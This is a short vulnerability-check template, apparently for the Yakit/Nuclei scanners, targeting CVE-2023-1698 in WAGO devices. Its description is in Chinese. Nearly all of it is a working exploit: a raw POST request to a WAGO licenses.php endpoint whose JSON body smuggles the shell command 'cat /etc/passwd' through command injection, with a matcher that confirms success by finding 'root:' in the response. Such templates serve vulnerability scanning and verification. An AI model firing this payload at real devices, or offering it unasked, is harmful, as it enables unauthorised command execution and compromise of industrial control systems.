script_name: WAGO系统远程代码执行漏洞
content:
id: CVE-2023-1698

info:
  name: WAGO系统远程代码执行漏洞
  author: Deans
  severity: high
  description: 在 WAGO 的多个产品中，一个漏洞允许未经身份验证的远程攻击者创建新用户并更改设备配置，可导致远程RCE、拒绝服务等使整个系统受损。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 817765b92c4c7d893ddecce16b777ca4

http:
- raw:
  - |-
    @timeout: 30s
    POST /wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip, deflate

    {"package":";cat /etc/passwd;#"}

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'root:'
    condition: and
